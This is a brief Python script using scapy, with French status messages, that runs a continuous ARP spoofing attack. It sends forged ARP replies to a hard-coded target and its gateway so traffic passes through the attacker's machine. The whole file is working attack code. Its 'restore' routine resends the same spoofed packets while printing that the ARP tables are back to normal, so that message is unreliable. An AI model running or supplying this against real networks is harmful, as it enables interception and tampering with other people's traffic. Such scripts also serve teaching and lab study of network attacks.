from scapy.all import *
import time

target_ip = "10.2.1.10"  
gateway_ip = "10.2.1.254"  

target_mac = getmacbyip(target_ip)
gateway_mac = getmacbyip(gateway_ip)


def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac):
    packet_to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    

    packet_to_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
    

    send(packet_to_target, verbose=False)
    send(packet_to_gateway, verbose=False)
    print(f"Envoi des paquets ARP : {target_ip} <-> {gateway_ip}")


def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):

    packet_to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    packet_to_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
    

    send(packet_to_target, count=5, verbose=False)
    send(packet_to_gateway, count=5, verbose=False)
    print("Tables ARP restaurées à leur état normal.")


try:
    while True:
        arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac)
        time.sleep(2)  
except KeyboardInterrupt:
    print("\nAttaque interrompue par l'utilisateur.")
    restore_arp(target_ip, target_mac, gateway_ip, gateway_mac) 
